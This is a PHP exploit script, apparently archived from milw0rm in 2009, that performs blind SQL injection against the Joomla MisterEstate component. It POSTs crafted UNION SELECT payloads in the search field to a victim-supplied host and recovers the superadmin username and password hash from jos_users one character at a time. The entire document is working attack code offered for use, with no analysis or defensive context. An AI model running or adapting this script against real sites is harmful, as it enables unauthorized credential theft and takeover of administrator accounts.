<html><head><title>Joomla Component MisterEstate Blind SQL Injection Exploit</title></head><pre>&lt;?php

  echo '&lt;h2&gt;Joomla Component MisterEstate Blind SQL Injection Exploit&lt;/h2&gt;';

  // http://www.misterestate.com/

  ini_set( &quot;memory_limit&quot;, &quot;512M&quot; );

                ini_set( &quot;max_execution_time&quot;, 0 );

                set_time_limit( 0 );

                if( !isset( $_GET['url'] ) ) die( 'Usage: '.$_SERVER['SCRIPT_NAME'].'?url=www.victim.com' );

  $url = &quot;http://&quot;.$_GET['url'].&quot;/index.php?option=com_misterestate&amp;act=mesearch&amp;task=showMESR&amp;tmpl=component&quot;;

  $data = array();

  $data['src_cat'] = 0;

  $data['country'] = 'no';

  $data['state'] = 'no';

  $data['town'] = 'no';

  $data['district'] = 'no';

  $data['mesearch'] = 'Start Search';

  $admin = '';

  $output = getData( &quot;1%') AND 1=2 UNION SELECT id FROM jos_users WHERE gid=25 ORDER BY id ASC LIMIT 1 -- '&quot; );

  if( !testData( $output ) ) die('failed');

  echo '&lt;br /&gt;Check passed... trying exploit...&lt;br /&gt;&lt;br /&gt;';

 

  for( $i=0;$i&lt;250;$i++ )

  {

    for( $j=48; $j&lt;126; $j++ )

    {

      $output = getData( &quot;1%') AND 1=2 UNION SELECT id FROM jos_users WHERE gid=25 AND ASCII(SUBSTRING(CONCAT(username,0x3a,password),$i,1)) = $j ORDER BY id ASC LIMIT 1 -- '&quot; );

      if( testData( $output ) )

      {

        ob_end_clean();

        $admin .= chr( $j );

        echo &quot;Found character $i : buffer is now $admin&lt;br /&gt;&quot;;

      }

      ob_end_clean();

    }

  }

  echo &quot;&lt;h3&gt;All done!&lt;/h3&gt;&quot;;

  echo &quot;&lt;h4&gt;$admin&lt;/h4&gt;&quot;;

  function shutUp( $buffer ) { return false; }

  function testData( $output )

  {

    /* feel free to add other translations as needed */

    $reg = array( '/Your\ search\ produced\ 1\ hits/', '/Su\ busqueda\ ha\ encontrado\ 1\ aciertos/' );

    foreach( $reg as $r )

      if( preg_match( $r, $output ) )

        return TRUE;

    return FALSE;

  }

  function getData( $string )

  {

    global $data, $url;

    $data['searchstring'] = $string;

    ob_start( &quot;shutUp&quot; );

    $ch = curl_init();

    curl_setopt( $ch, CURL_TIMEOUT, 120 );

    curl_setopt( $ch, CURL_RETURNTRANSFER, 0 );

    curl_setopt( $ch, CURLOPT_URL, $url );

    if( count( $data ) &gt; 0 )

    {

      curl_setopt( $ch, CURLOPT_POST, count( $data ) );

      curl_setopt( $ch, CURLOPT_POSTFIELDS, http_build_query( $data ) );

    }

    curl_setopt( $ch, CURLOPT_USERAGENT, &quot;Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)&quot; );

    curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );

    $result = curl_exec( $ch );

    curl_close( $ch );

    return ob_get_contents();

  }

  /* jdc 2009 */

# milw0rm.com [2009-08-18]</pre></html>